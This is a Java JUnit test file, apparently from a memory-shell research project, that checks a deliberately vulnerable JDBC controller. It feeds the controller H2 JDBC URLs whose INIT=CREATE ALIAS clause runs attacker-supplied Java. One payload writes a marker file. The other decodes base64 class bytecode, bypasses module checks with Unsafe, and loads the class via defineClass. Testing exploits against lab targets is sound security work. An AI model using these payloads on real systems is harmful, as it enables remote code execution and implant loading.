import com.reajason.javaweb.vul.springboot4.controller.JDBCController;
import org.junit.jupiter.api.Test;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * @author ReaJason
 * @since 2025/6/27
 */
public class JDBCTest {

    private static final Path RCE_MARKER = Paths.get(System.getProperty("java.io.tmpdir"),
            System.getProperty("memshell.vul.rce.marker", "memshell-vul-rce-proof.txt"));

    @Test
    void testJDBC() throws Exception {
        Files.deleteIfExists(RCE_MARKER);
        JDBCController jdbcController = new JDBCController();
        String funcionName = "testJDBC";
        String str = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS " + funcionName + " AS '" +
                "String shellexec(String abc) throws java.lang.Exception{" +
                "java.nio.file.Files.write(java.nio.file.Paths.get(System.getProperty(\"java.io.tmpdir\"),System.getProperty(\"memshell.vul.rce.marker\",\"memshell-vul-rce-proof.txt\")),\"rce\".getBytes())\\;" +
                "return \"test\"\\;" +
                "}'\\;" +
                "CALL " + funcionName + "('123')";
        jdbcController.JDBC(str);
        assertTrue(Files.exists(RCE_MARKER));
        Files.deleteIfExists(RCE_MARKER);
    }

    @Test
    void testJDBC2() throws Exception {
        Files.deleteIfExists(RCE_MARKER);
        JDBCController jdbcController = new JDBCController();
        String b64Bytecode = "yv66vgAAAD0ANgoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAIAQAOamF2YS5pby50bXBkaXIKAAoACwcADAwADQAOAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsHABABABBqYXZhL2xhbmcvU3RyaW5nCAASAQAXbWVtc2hlbGwudnVsLnJjZS5tYXJrZXIIABQBABptZW1zaGVsbC12dWwtcmNlLXByb29mLnR4dAoACgAWDAANABcBADgoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwoAGQAaBwAbDAAcAB0BABNqYXZhL25pby9maWxlL1BhdGhzAQADZ2V0AQA7KExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbmlvL2ZpbGUvUGF0aDsIAB8BAANyY2UKAA8AIQwAIgAjAQAIZ2V0Qnl0ZXMBAAQoKVtCBwAlAQAYamF2YS9uaW8vZmlsZS9PcGVuT3B0aW9uCgAnACgHACkMACoAKwEAE2phdmEvbmlvL2ZpbGUvRmlsZXMBAAV3cml0ZQEARyhMamF2YS9uaW8vZmlsZS9QYXRoO1tCW0xqYXZhL25pby9maWxlL09wZW5PcHRpb247KUxqYXZhL25pby9maWxlL1BhdGg7BwAtAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcALwEAC0NvbW1hbmRFeGVjAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQEAClNvdXJjZUZpbGUBABBDb21tYW5kRXhlYy5qYXZhACEALgACAAAAAAACAAEABQAGAAEAMAAAAB0AAQABAAAABSq3AAGxAAAAAQAxAAAABgABAAAABQAIADIABgABADAAAAB1AAYAAQAAACgSB7gACQS9AA9ZAxIREhO4ABVTuAAYEh62ACADvQAkuAAmV6cABEuxAAEAAAAjACYALAACADEAAAAmAAkAAAAIAAIACQAPAAoAEwAJABgACwAfAAgAIwAOACYADAAnAA8AMwAAAAcAAmYHACwAAAEANAAAAAIANQ==";
        String str = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS look AS '" +
                "String a(String a) throws java.lang.Throwable{" +
                "String base64Str=\"" + b64Bytecode + "\"\\;" +
                "byte[] bytes=java.util.Base64.getDecoder().decode(base64Str)\\;" +
                "try {" +
                "    java.lang.Class<?> unsafeClass = Class.forName(\"sun.misc.Unsafe\")\\;" +
                "    java.lang.reflect.Field unsafeField = unsafeClass.getDeclaredField(\"theUnsafe\")\\;" +
                "    unsafeField.setAccessible(true)\\;" +
                "    java.lang.Object unsafe = unsafeField.get(null)\\;" +
                "    java.lang.Object module = Class.class.getMethod(\"getModule\").invoke(java.lang.Object.class, (java.lang.Object[]) null)\\;" +
                "    java.lang.reflect.Method objectFieldOffsetM = unsafe.getClass().getMethod(\"objectFieldOffset\", java.lang.reflect.Field.class)\\;" +
                "    long offset = (Long) objectFieldOffsetM.invoke(unsafe, java.lang.Class.class.getDeclaredField(\"module\"))\\;" +
                "    java.lang.reflect.Method getAndSetObjectM = unsafe.getClass().getMethod(\"getAndSetObject\", java.lang.Object.class, long.class, java.lang.Object.class)\\;" +
                "    java.lang.StackTraceElement[] stackTraceElements = java.lang.Thread.currentThread().getStackTrace()\\;" +
                "    java.lang.Class<?> callerClass = java.lang.Class.forName(stackTraceElements[1].getClassName())\\;" +
                "    getAndSetObjectM.invoke(unsafe, callerClass, offset, module)\\;" +
                "} catch (Throwable e) {}" +
                "java.lang.reflect.Method defMethod=java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\",bytes.getClass(),int.class,int.class)\\;" +
                "defMethod.setAccessible(true)\\;" +
                "java.lang.ClassLoader cl=new java.net.URLClassLoader(new java.net.URL[0])\\;" +
                "java.lang.Class myclass=(java.lang.Class)defMethod.invoke(cl,bytes,0,bytes.length)\\;" +
                "myclass.newInstance()\\;" +
                "return null\\;" +
                "}'\\;" +
                "CALL look('')";
        System.out.println(str);
        jdbcController.JDBC(str);
        assertTrue(Files.exists(RCE_MARKER));
        Files.deleteIfExists(RCE_MARKER);
    }
}
